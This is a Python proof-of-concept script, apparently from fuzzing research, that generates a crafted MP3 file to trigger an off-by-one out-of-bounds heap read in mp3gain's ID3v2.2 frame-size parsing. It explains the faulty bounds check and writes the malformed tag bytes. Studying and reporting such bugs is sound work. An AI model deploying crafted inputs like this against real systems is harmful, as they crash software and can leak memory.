#!/usr/bin/env python3
"""
PoC generator for VULN 001: Off-by-one OOB heap read in ID3v2.2 frame size parsing
Function: id3_parse_v2_tag() in id3tag.c, line 583-592
CWE-125 (Out-of-bounds Read)

Root cause:
  The boundary check at line 583 is:
    if (p + 5 > dlen) goto badtag;
  but the code immediately reads tagdata[p+5] at line 592:
    flen = (tagdata[p+3] << 16) | (tagdata[p+4] << 8) | tagdata[p+5];
  An ID3v2.2 frame header needs 6 bytes, but the check only requires 5.

  When p + 5 == dlen  =>  the check "p + 5 > dlen" is false  =>  no badtag
  =>  tagdata[dlen] is read one byte past the end of malloc(dlen).

Strategy (dlen=16, two-frame layout):
  Frame 1 (bytes 0-10): "TT2" + size=5 + 5 bytes data → p advances to 11
  Frame 2 (bytes 11-15): "TT2" + only 2 of the 3 size bytes fit
    p=11, dlen=16:
      check: 11 + 5 = 16 > 16  =>  false  =>  no badtag
      read: tagdata[11+5] = tagdata[16]  =>  OOB!

  malloc(16) fills exactly two 8-byte ASAN shadow groups (shadow = 0 each).
  Byte 16 is the first byte of the right redzone (shadow = 0xf2).
  ASAN will catch this as a heap-buffer-overflow.
"""
import struct
import os

def syncsafe4(n):
    """Encode n as 4-byte syncsafe integer (each byte uses only 7 bits)."""
    result = bytearray(4)
    for i in range(3, -1, -1):
        result[i] = n & 0x7F
        n >>= 7
    return bytes(result)

output = "/data/ylwang/non-textfuzz/target/_poc/mp3gain/id3tag_c/vuln_001.mp3"

# ID3v2.2 header (10 bytes):
#   "ID3"        - magic
#   0x02, 0x00   - version 2.2, minor 0
#   0x00         - flags (no UNSYNC, no EXTHDR, no FOOTER)
#   syncsafe4(16) - tag body size = 16 bytes => malloc(16)
tag_body_size = 16
id3_header = b"ID3" + bytes([0x02, 0x00, 0x00]) + syncsafe4(tag_body_size)
assert len(id3_header) == 10

# Tag body: exactly 16 bytes
#
# Layout:
#   Bytes  0- 2: "TT2"         frame 1 ID (maps to TIT2; non-null so loop is entered)
#   Bytes  3- 5: 0x00 0x00 0x05  frame 1 size = 5
#   Bytes  6-10: 0x00*5         frame 1 data (5 zero bytes)
#   Bytes 11-13: "TT2"         frame 2 ID (non-null so second loop iteration is entered)
#   Bytes 14-15: 0x00 0x00     first 2 bytes of frame 2 size (only 2 bytes fit)
#   Byte   16  : OOB           third byte of frame 2 size - past malloc(16)
#
# Execution trace for frame 2 (p=11, dlen=16):
#   Line 583: if (11 + 5 > 16) => if (16 > 16) => false => NO goto badtag
#   Line 592: flen = (tagdata[14]<<16) | (tagdata[15]<<8) | tagdata[16]
#                                                            ^^^^^^^^^^
#                                                            OOB READ HERE
#
# ASAN will catch tagdata[16] as heap-buffer-overflow because malloc(16) fills
# exactly two 8-byte shadow groups; byte 16 is in the right redzone.
tag_body = (
    b"TT2" +             # frame 1 ID
    bytes([0x00, 0x00, 0x05]) +  # frame 1 size = 5
    bytes(5) +           # frame 1 data (5 zero bytes)
    b"TT2" +             # frame 2 ID
    bytes([0x00, 0x00])  # first 2 of 3 size bytes for frame 2
)
assert len(tag_body) == 16, f"tag_body length is {len(tag_body)}, expected 16"

# Minimal MPEG1 Layer3 audio frame so mp3gain can proceed past the ID3 tag.
# MPEG1 Layer3 128kbps 44100Hz stereo sync word = 0xFFFA or 0xFFFB.
mp3_sync = bytes([0xFF, 0xFB, 0x90, 0x00])
mp3_padding = bytes(413)  # MPEG1 Layer3 frame size at 128kbps ~ 417 bytes

data = id3_header + tag_body + mp3_sync + mp3_padding

os.makedirs(os.path.dirname(output), exist_ok=True)
with open(output, 'wb') as f:
    f.write(data)

print(f"Written {len(data)} bytes to {output}")
print(f"  ID3 header : {len(id3_header)} bytes  ({id3_header.hex()})")
print(f"  Tag body   : {len(tag_body)} bytes  ({tag_body.hex()})")
print(f"    Frame 1  : bytes 0-10 (TT2 + size=5 + 5 bytes data)")
print(f"    Frame 2  : bytes 11-15 (TT2 + 2/3 size bytes; tagdata[16] is OOB)")
print(f"  MP3 frame  : {len(mp3_sync) + len(mp3_padding)} bytes")
print(f"  dlen={tag_body_size}: malloc({tag_body_size}) -> tagdata[16] is in right redzone")
